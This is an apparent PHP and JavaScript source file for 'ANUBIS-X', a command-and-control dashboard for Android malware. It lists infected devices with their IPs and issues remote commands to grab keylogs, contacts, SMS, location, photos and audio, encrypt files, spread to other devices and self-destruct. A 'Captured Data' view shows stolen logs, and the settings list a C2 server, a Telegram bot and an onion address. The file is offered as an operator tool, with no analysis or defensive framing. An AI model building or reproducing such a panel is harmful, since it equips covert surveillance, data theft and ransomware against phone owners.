<?php
session_start();
if (!isset($_SESSION['logged_in'])) {
    header('Location: index.html');
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ANUBIS-X Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0a0a0a;
            font-family: 'Courier New', monospace;
            color: #00ff00;
        }
        
        .header {
            background: #1a1a1a;
            padding: 20px;
            text-align: center;
            border-bottom: 2px solid #00ff00;
        }
        
        .header h1 {
            font-size: 28px;
            text-shadow: 0 0 10px #00ff00;
        }
        
        .container {
            display: flex;
            height: calc(100vh - 80px);
        }
        
        .sidebar {
            width: 200px;
            background: #1a1a1a;
            padding: 20px;
            border-right: 2px solid #00ff00;
        }
        
        .sidebar button {
            width: 100%;
            padding: 12px;
            margin: 5px 0;
            background: transparent;
            border: 1px solid #00ff00;
            color: #00ff00;
            cursor: pointer;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }
        
        .sidebar button:hover {
            background: #00ff00;
            color: #000;
        }
        
        .main-content {
            flex: 1;
            padding: 20px;
            overflow-y: auto;
        }
        
        .device-card {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            border-radius: 5px;
            padding: 15px;
            margin: 10px 0;
            cursor: pointer;
        }
        
        .device-card:hover {
            background: #2a2a2a;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
        }
        
        .device-online {
            color: #00ff00;
        }
        
        .device-offline {
            color: #ff0000;
        }
        
        .command-panel {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            border-radius: 5px;
            padding: 20px;
            margin-top: 20px;
        }
        
        .command-buttons {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 15px;
        }
        
        .command-btn {
            padding: 10px;
            background: transparent;
            border: 1px solid #00ff00;
            color: #00ff00;
            cursor: pointer;
            border-radius: 5px;
        }
        
        .command-btn:hover {
            background: #00ff00;
            color: #000;
        }
        
        .log-output {
            background: #000;
            border: 1px solid #00ff00;
            padding: 10px;
            height: 300px;
            overflow-y: auto;
            margin-top: 20px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>⚡ ANUBIS-X COMMAND CENTER ⚡</h1>
    </div>
    
    <div class="container">
        <div class="sidebar">
            <button onclick="showDevices()">📱 Devices</button>
            <button onclick="showCommands()">🎮 Commands</button>
            <button onclick="showLogs()">📊 Logs</button>
            <button onclick="showSettings()">⚙️ Settings</button>
            <button onclick="logout()">🚪 Logout</button>
        </div>
        
        <div class="main-content" id="mainContent">
            <!-- المحتوى الديناميكي -->
        </div>
    </div>
    
    <script>
        function showDevices() {
            fetch('api/devices.php')
                .then(response => response.json())
                .then(data => {
                    let html = '<h2>📱 Connected Devices</h2>';
                    
                    data.devices.forEach(device => {
                        html += `
                            <div class="device-card" onclick="selectDevice('${device.id}')">
                                <h3 class="${device.online ? 'device-online' : 'device-offline'}">
                                    ${device.online ? '🟢' : '🔴'} ${device.model}
                                </h3>
                                <p>ID: ${device.id}</p>
                                <p>IP: ${device.ip}</p>
                                <p>Android: ${device.android_version}</p>
                            </div>
                        `;
                    });
                    
                    document.getElementById('mainContent').innerHTML = html;
                });
        }
        
        function selectDevice(deviceId) {
            showCommandPanel(deviceId);
        }
        
        function showCommandPanel(deviceId) {
            let html = `
                <div class="command-panel">
                    <h2>🎮 Command Panel - Device: ${deviceId}</h2>
                    
                    <div class="command-buttons">
                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'keylog')">📝 Get Keylog</button>
                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'contacts')">📞 Get Contacts</button>
                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'sms')">💬 Get SMS</button>
                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'location')">📍 Get Location</button>
                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'camera')">📷 Take Photo</button>
                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'audio')">🎤 Record Audio</button>
                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'encrypt')">🔒 Encrypt Files</button>
                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'spread')">📡 Spread</button>
                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'selfdestruct')">💣 Self Destruct</button>
                    </div>
                </div>
                
                <div class="log-output" id="logOutput">
                    <p>> Waiting for command execution...</p>
                </div>
            `;
            
            document.getElementById('mainContent').innerHTML = html;
        }
        
        function sendCommand(deviceId, command) {
            fetch('api/commands.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    device_id: deviceId,
                    command: command
                })
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('logOutput').innerHTML += `<p>> Command sent: ${command}</p>`;
                if (data.result) {
                    document.getElementById('logOutput').innerHTML += `<p>> Result: ${data.result}</p>`;
                }
            });
        }
        
        function showLogs() {
            fetch('api/data.php')
                .then(response => response.json())
                .then(data => {
                    let html = '<h2>📊 Captured Data</h2>';
                    
                    data.logs.forEach(log => {
                        html += `<div class="device-card"><p>${log}</p></div>`;
                    });
                    
                    document.getElementById('mainContent').innerHTML = html;
                });
        }
        
        function showSettings() {
            document.getElementById('mainContent').innerHTML = `
                <h2>⚙️ Settings</h2>
                <div class="command-panel">
                    <h3>C2 Server Configuration</h3>
                    <p>Server URL: https://your-c2-server.com</p>
                    <p>Telegram Bot: @AnubisXBot</p>
                    <p>TOR: anubisx.onion</p>
                </div>
            `;
        }
        
        function logout() {
            window.location.href = 'index.html';
        }
    </script>
</body>
</html>